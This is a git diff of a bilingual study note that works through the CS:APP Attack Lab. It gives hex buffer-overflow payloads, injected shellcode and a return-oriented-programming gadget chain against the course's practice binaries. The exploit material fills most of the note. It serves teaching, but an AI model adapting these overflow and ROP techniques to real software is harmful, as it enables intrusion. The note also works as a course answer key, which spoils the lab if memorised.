@@ -1,13 +1,5 @@
----
-attachments: [Clipboard_2022-06-02-16-04-16.png, Clipboard_2022-06-03-16-32-02.png, Clipboard_2022-06-03-16-32-51.png, Clipboard_2022-06-03-16-42-08.png]
-tags: [csapp/05-09]
-title: Attack lab
-created: '2022-06-01T15:17:07.722Z'
-modified: '2022-06-03T15:36:56.537Z'
----
-
 # Attack lab
- 
+
  + [实验说明-视频](https://www.bilibili.com/video/BV1a54y1k7YE?p=12)
  + [writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
  + Code Injection Attacks
@@ -46,7 +38,7 @@ modified: '2022-06-03T15:36:56.537Z'
         }
 
      > When getbuf executes its return statement (line 5 of getbuf), the program          ordinarily resumes execution within function test (at line 5 of this function).    We want to change this behavior. Within the file ctarget,there is code for a       function touch1 having the following C representation:
- 
+
         void touch1()
         {
         vlevel = 1; /* Part of validation protocol */
@@ -70,7 +62,7 @@ modified: '2022-06-03T15:36:56.537Z'
         4017be:	90                   	nop
         4017bf:	90                   	nop
         //getbuf()分配的栈空间为0x28 = 40byte
-
+        
         00000000004017c0 <touch1>:
         4017c0:	48 83 ec 08          	sub    $0x8,%rsp
         4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
@@ -82,7 +74,7 @@ modified: '2022-06-03T15:36:56.537Z'
         4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
         4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
         //touch1的地址为0x4017c0
-
+        
         0000000000401968 <test>:
         401968:	48 83 ec 08          	sub    $0x8,%rsp
         40196c:	b8 00 00 00 00       	mov    $0x0,%eax
@@ -98,7 +90,7 @@ modified: '2022-06-03T15:36:56.537Z'
         // 任意字节填充前40byte，
 
   ![](@attachment/Clipboard_2022-06-02-16-04-16.png)
-  
+
         level1.txt
         00 00 00 00 00 00 00 00
         00 00 00 00 00 00 00 00
@@ -106,7 +98,7 @@ modified: '2022-06-03T15:36:56.537Z'
         00 00 00 00 00 00 00 00
         00 00 00 00 00 00 00 00
         c0 17 40 00 00 00 00 00
-
+    
         ./hex2raw -i level1.txt | ./ctarget -q
 
 2. phase2
@@ -146,7 +138,7 @@ Within the file ctarget there is code for a function touch2 having the following
           lea $0x59b997fa %rdi
           push $0x4017ec
           ret
-
+    
           0000000000000000 <.text>:
           0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi // cooki in %rdi
           7:	68 ec 17 40 00       	pushq  $0x4017ec //touch2 地址
@@ -166,7 +158,7 @@ Within the file ctarget there is code for a function touch2 having the following
         00 00 00 00 00 00 00 00
         00 00 00 00 00 00 00 00
         78 dc 61 55 00 00 00 00      /* 返回地址设置为getbuf的栈顶 */
-
+    
         ./hex2raw -i level2.txt | ./ctarget -q
 
 3. phase3
@@ -183,7 +175,7 @@ Within the file ctarget there is code for functions hexmatch and touch3 having t
           sprintf(s, "%.8x", val);
           return strncmp(sval, s, 9) == 0;
         }
-
+    
          void touch3(char *sval)
         {
           vlevel = 3; /* Part of validation protocol */
@@ -218,16 +210,16 @@ Within the file ctarget there is code for functions hexmatch and touch3 having t
         (gdb) print $rsp
         $1 = (void *) 0x5561dca8
         将改地址用来保存字符串
-
+    
         movq $0x5561dca8,%rdi //%rdi 保存字符串地址， 
         push $0x4018fa //转移到touch3
         ret
-
+    
         0000000000000000 <.text>:
         0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
         7:	68 fa 18 40 00       	pushq  $0x4018fa
         c:	c3                   	retq   
-
+    
         level3.txt:
         48 c7 c7 a8 dc 61 55 68      /* 注入代码 */
         fa 18 40 00 c3 00 00 00
@@ -236,9 +228,9 @@ Within the file ctarget there is code for functions hexmatch and touch3 having t
         00 00 00 00 00 00 00 00
         78 dc 61 55 00 00 00 00      /* 返回地址,即getbuf的栈顶 */
         35 39 62 39 39 37 66 61      /* 字符串 */
-
+    
         ./hex2raw -i level3.txt | ./ctarget -q
-
+    
         + 一个疑惑点解答：大小端是具多个字节数据的内部排列顺序
         > 对于ascii的字符串，它的基本数据类型是char，占据一个字节，不存在内部，按字符从高到低排序。
           对于如int型这样占据多个字节的数据，才有大小端之分。
@@ -323,22 +315,22 @@ Within the file ctarget there is code for functions hexmatch and touch3 having t
         movl %eax, %edx;ret;    //
         0x20                    //偏移量
         popq %rax
-
+        
         00000000004019a7 <addval_219>:
         4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
         4019ad:	c3                   	retq  
         + 4019ab:58 90 c3 -> popq %rax;ret;
-
+        
         00000000004019db <getval_481>:
         4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
         4019e0:	c3                   	retq   
         + 4019dd:89 c2 90 c3 -> movl %eax, %edx;ret;
-
+        
         0000000000401a68 <getval_311>:
         401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
         401a6d:	c3                   	retq  
         + 401a69: 89 d1 -> movl %edx, %ecx; 08 db -> orb %bl, %bl;//无影响 ret;
-
+        
         0000000000401a11 <addval_436>:
         401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
         401a17:	c3                   	retq   
@@ -349,12 +341,12 @@ Within the file ctarget there is code for functions hexmatch and touch3 having t
         401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
         401a09:	c3                   	retq     
         + 401a06:48 89 e0 c3 -> movq %rsp, %rax;ret
-
+    
         00000000004019a0 <addval_273>:
         4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
         4019a6:	c3                   	retq   
         + 4019a2: 48 89 c7 c3 -> movl %rax, %rdi;ret;
-
+    
         00000000004019d6 <add_xy>:
         4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
         4019da:	c3                   	retq   
@@ -376,6 +368,6 @@ Within the file ctarget there is code for functions hexmatch and touch3 having t
         a2 19 40 00 00 00 00 00  /* movl %rax, %rdi;ret; */
         fa 18 40 00 00 00 00 00  /* touch3 address */
         35 39 62 39 39 37 66 61  /* cooki字符串 */
-
+    
         ./hex2raw -i phase5.txt | ./rtarget -q
 
